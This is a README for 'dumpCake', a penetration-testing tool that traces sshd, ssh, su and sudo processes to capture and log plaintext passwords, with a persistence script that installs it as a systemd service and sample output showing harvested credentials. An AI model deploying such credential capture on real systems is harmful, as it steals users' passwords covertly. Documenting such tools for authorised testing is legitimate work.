# dumpCake

This tool captures and logs passwords used during authentication attempts for su/sudo and inbound and outbound SSH sessions. It works by attaching to each SSHD, SSH, Sudo, and Su process and recording the attempted passwords and related details.

It can be particularly useful during a penetration test when scanning computers on a network and attempting to authenticate with Domain Admin credentials.

It can be employed on a jumphost to capture plaintext credentials when users elevate their privileges or SSH elsewhere in the environment.

# Prerequisites
sudo apt install strace

# Usage

```
┌──(root㉿kali)-[~/dumpCake]
└─# ./cake.sh 
Writing to /root/pass.log

Found SSHD Pid: 3011949. Attaching...

Process: sshd: unknown [priv]
May 23 17:16:03 kali sshd[3011949]: Invalid user frank from 172.25.25.132 port 50962
May 23 17:16:06 kali sshd[3011949]: Failed password for invalid user frank from 172.25.25.132 port 50962 ssh2
May 23 17:16:20 kali sshd[3011949]: Failed password for invalid user frank from 172.25.25.132 port 50962 ssh2
May 23 17:16:21 kali sshd[3011949]: Failed password for invalid user frank from 172.25.25.132 port 50962 ssh2
May 23 17:16:21 kali sshd[3011949]: Connection reset by invalid user frank 172.25.25.132 port 50962 [preauth]
Password Attempt 1: "1234"
Password Attempt 2: "Spring2022!"
Password Attempt 3: ""
----------------------------------------------------
Found SSHD Pid: 3022996. Attaching...

Process: sshd: spicy [priv]
May 23 17:16:32 kali sshd[3022996]: Accepted password for spicy from 172.25.25.132 port 50964 ssh2
Password Attempt 1: "Password1!"
----------------------------------------------------
Found Outbound SSH Pid: 3575968. Attaching...

Process: ssh pi@pi.hole
User: spicy
Password Attempt 1: "1234"
Password Attempt 2: "!beep20"
----------------------------------------------------
Found Su Pid: 3028865. Attaching...

Process: su spicy
User: spicy
Password Attempt: "Password1!"
Successfully Elevated
----------------------------------------------------
Found Sudo Pid: 3037832. Attaching...

Process: sudo id
User: root
Elevation Failed
----------------------------------------------------
Found Sudo Pid: 3040090. Attaching...

Process: sudo id
User: spicy
Password Attempt 1: "Password1!"
Successfully Elevated
----------------------------------------------------
```

# To install as a service
```
┌──(root㉿kali)-[~/dumpCake]
└─# ./persist.sh 
Created symlink /etc/systemd/system/multi-user.target.wants/password-logging.service → /etc/systemd/system/password-logging.service.
```

# Log output
```
┌──(root㉿kali)-[~]
└─# tail -f pass.log 
Process: sshd: unknown [priv]
May 23 17:16:03 kali sshd[3011949]: Invalid user frank from 172.25.25.132 port 50962
May 23 17:16:06 kali sshd[3011949]: Failed password for invalid user frank from 172.25.25.132 port 50962 ssh2
May 23 17:16:20 kali sshd[3011949]: Failed password for invalid user frank from 172.25.25.132 port 50962 ssh2
May 23 17:16:21 kali sshd[3011949]: Failed password for invalid user frank from 172.25.25.132 port 50962 ssh2
May 23 17:16:21 kali sshd[3011949]: Connection reset by invalid user frank 172.25.25.132 port 50962 [preauth]
Password Attempt 1: "1234"
Password Attempt 2: "Spring2022!"
Password Attempt 3: ""
----------------------------------------------------
Process: ssh pi@pi.hole
User: spicy
Password Attempt 1: "1234"
Password Attempt 2: "!beep20"
----------------------------------------------------
Process : sshd: spicy [priv]
May 23 17:16:32 kali sshd[3022996]: Accepted password for spicy from 172.25.25.132 port 50964 ssh2
Password Attempt 1: "Password1!"
----------------------------------------------------
Process : su spicy
User: spicy
Password Attempt: "Password1!"
Successfully Elevated
----------------------------------------------------
Process : sudo id
User: root
Elevation Failed
----------------------------------------------------
Process : sudo id
User: spicy
Password Attempt 1: "Password1!"
Successfully Elevated
----------------------------------------------------

```
